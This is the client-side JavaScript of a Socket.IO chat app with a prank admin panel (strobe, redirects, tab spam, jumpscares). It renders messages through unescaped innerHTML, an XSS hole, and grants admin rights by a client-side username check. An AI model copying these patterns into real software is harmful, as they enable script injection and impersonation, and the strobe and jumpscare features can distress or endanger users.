const socket = io();
const username = sessionStorage.getItem('username');
let isAdmin = false;

document.addEventListener('DOMContentLoaded', () => {
  if (!username) {
    window.location.href = '/login';
    return;
  }

  document.getElementById('usernameDisplay').textContent = username;

  // Admin check
  if (username === 'X12') {
    isAdmin = true;
    document.getElementById('adminControls').style.display = 'block';
  }

  // Send message
  const form = document.getElementById('chatForm');
  const input = document.getElementById('messageInput');
  const chatBox = document.getElementById('chatBox');

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    if (input.value.trim() !== '') {
      socket.emit('chat message', {
        username,
        message: input.value
      });
      input.value = '';
      input.disabled = true;
      setTimeout(() => input.disabled = false, 3000);
    }
  });

  // Display message
  socket.on('chat message', (data) => {
    const msgEl = document.createElement('div');
    msgEl.className = 'message';
    msgEl.innerHTML = `<strong>${data.username}:</strong> ${data.message}`;
    chatBox.appendChild(msgEl);
    chatBox.scrollTop = chatBox.scrollHeight;
  });

  // Handle admin actions
  socket.on('admin action', (action) => {
    switch (action.type) {
      case 'strobe':
        const duration = action.duration || 3000;
        const interval = setInterval(() => {
          document.body.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
        }, 100);
        setTimeout(() => {
          clearInterval(interval);
          document.body.style.backgroundColor = '';
        }, duration);
        break;
      case 'redirect':
        if (username === action.target) window.location.href = action.url;
        break;
      case 'timeout':
        if (username === action.target) {
          alert('You have been timed out!');
          document.body.innerHTML = '<h2>You are timed out</h2>';
        }
        break;
      case 'kick':
        if (username === action.target) window.location.href = 'https://google.com';
        break;
      case 'spamTabs':
        if (username === action.target) {
          for (let i = 0; i < action.amount; i++) {
            window.open('https://sharcord.lol', '_blank');
          }
        }
        break;
      case 'announcement':
        const bar = document.createElement('div');
        bar.textContent = action.message;
        bar.style.cssText = 'position:fixed;top:0;width:100%;background:#f00;color:#fff;text-align:center;padding:10px;';
        document.body.prepend(bar);
        break;
      case 'jumpscare':
        const img = document.createElement('img');
        const audio = new Audio(action.audioURL);
        img.src = action.imageURL;
        img.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;';
        document.body.appendChild(img);
        audio.play();
        setTimeout(() => img.remove(), 3000);
        break;
    }
  });

  // Admin panel buttons
  if (isAdmin) {
    document.getElementById('strobeBtn').onclick = () => {
      const duration = parseInt(prompt('Enter strobe duration (ms):')) || 3000;
      socket.emit('admin action', { type: 'strobe', duration });
    };

    document.getElementById('timeoutBtn').onclick = () => {
      const user = prompt('Username to timeout:');
      socket.emit('admin action', { type: 'timeout', target: user });
    };

    document.getElementById('kickBtn').onclick = () => {
      const user = prompt('Username to kick:');
      socket.emit('admin action', { type: 'kick', target: user });
    };

    document.getElementById('redirectBtn').onclick = () => {
      const user = prompt('Username to redirect:');
      const url = prompt('URL to send them to:');
      socket.emit('admin action', { type: 'redirect', target: user, url });
    };

    document.getElementById('spamBtn').onclick = () => {
      const user = prompt('Username to spam tabs for:');
      const amount = parseInt(prompt('How many tabs?')) || 3;
      socket.emit('admin action', { type: 'spamTabs', target: user, amount });
    };

    document.getElementById('announceBtn').onclick = () => {
      const message = prompt('Announcement message:');
      socket.emit('admin action', { type: 'announcement', message });
    };

    document.getElementById('jumpscareBtn').onclick = () => {
      const imageURL = prompt('URL of image:');
      const audioURL = prompt('URL of audio:');
      socket.emit('admin action', { type: 'jumpscare', imageURL, audioURL });
    };
  }

  document.getElementById('logoutBtn').onclick = () => {
    sessionStorage.clear();
    window.location.href = '/login';
  };
});
